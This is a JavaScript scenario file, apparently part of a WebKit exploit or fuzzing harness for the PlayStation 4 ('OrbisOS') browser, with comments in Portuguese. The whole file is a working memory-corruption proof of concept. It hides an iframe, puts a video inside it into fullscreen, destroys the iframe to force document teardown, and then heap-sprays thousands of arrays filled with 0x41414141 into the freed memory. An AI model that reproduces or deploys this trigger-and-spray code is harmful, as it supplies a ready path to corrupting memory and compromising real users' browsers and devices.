
/**
 * CENÁRIO: VIDEO_FULLSCREEN_IFRAME_DROP
 * Alvo: Teardown Automático do Fullscreen via Destruição de Documento
 */

export default {
    id:       'VIDEO_FULLSCREEN_IFRAME_DROP',
    category: 'Media',
    risk:     'CRITICAL',
    description: 'Bypassa o Deadlock do OrbisOS implodindo o Iframe pai. ' +
                 'O WebKit forçará um cancelFullScreen() automático enquanto ' +
                 'destrói o MediaPlayerPrivate. O Spray preenche o buraco do Documento.',

    setup: async function() {
        // 1. Criamos a nossa "Caixa de Areia"
        this.iframe = document.createElement('iframe');
        this.iframe.setAttribute('allowfullscreen', 'true');
        this.iframe.style.width = '100px';
        this.iframe.style.height = '100px';
        this.iframe.style.opacity = '0.01'; // Invisível
        document.body.appendChild(this.iframe);

        // 2. Colocamos o alvo lá dentro
        const doc = this.iframe.contentDocument;
        this.video = doc.createElement('video');
        this.video.src = 'data:video/mp4;base64,AAAAFGZ0eXBtcDQyAAAAAG1wNDIAAAAIZnJlZQAAAAhtZGF0';
        this.video.controls = true;
        doc.body.appendChild(this.video);

        // 3. A munição: 0x41414141
        this.sprayPayload = new Uint32Array(256);
        this.sprayPayload.fill(0x41414141);

        await new Promise(resolve => {
            const timeout = setTimeout(resolve, 400);
            this.video.addEventListener('loadedmetadata', () => {
                clearTimeout(timeout);
                resolve();
            }, { once: true });
        });
    },

    trigger: async function() {
        try {
            // 1. Entra no Fullscreen DE DENTRO do Iframe
            if (this.video.webkitEnterFullscreen) {
                this.video.webkitEnterFullscreen();
            } else if (this.video.webkitRequestFullscreen) {
                this.video.webkitRequestFullscreen();
            }

            // Aguardamos o OrbisOS estabilizar a tela gráfica (crucial)
            await new Promise(r => setTimeout(r, 400)); 

            // 2. A IMPLOSÃO (O Iframe Drop)
            // Não removemos o vídeo. Removemos o UNIVERSO onde o vídeo existe.
            // Isso força o C++ a rodar Document::detach() e limpar o FullscreenController.
            this.iframe.remove();

            // 3. SPRAY MASSIVO IMEDIATO
            // O controlador de vídeo global vai tentar ler a memória do iframe destruído.
            this.spray = [];
            for (let i = 0; i < 6000; i++) {
                let arr = new Uint32Array(256);
                arr.set(this.sprayPayload);
                this.spray.push(arr);
            }

            // NOTA: Não chamamos exitFullscreen() manualmente. O WebKit fará 
            // isso sozinho como consequência do iframe.remove(). 
            // É aqui que a mágica da corrupção acontece.

        } catch(e) {}
    },

    probe: [
        // Como o Iframe foi pro lixo, nós apenas tentamos forçar o GC
        // acessando refs antigas, mas o crash geralmente acontece no C++.
        s => s.video ? s.video.videoWidth : null,
        s => s.video ? s.video.readyState : null
    ],

    cleanup: function() {
        try { this.iframe.remove(); } catch(e) {}
        this.spray = null;
        this.video = null;
        this.iframe = null;
    }
};
